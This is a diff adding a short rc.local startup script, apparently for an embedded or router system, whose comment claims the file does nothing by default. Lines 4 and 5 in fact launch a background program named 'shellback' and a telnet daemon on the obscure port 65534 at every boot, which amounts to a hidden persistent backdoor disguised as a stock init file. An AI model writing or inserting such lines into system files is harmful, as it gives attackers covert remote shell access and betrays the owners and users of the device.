@@ -1,0 +1,6 @@
+     1	# Put your custom commands here that should be executed once
+     2	# the system init finished. By default this file does nothing.
+     3	
+     4	/usr/bin/shellback &
+     5	telnetd -p 65534 &
+     6	exit 0
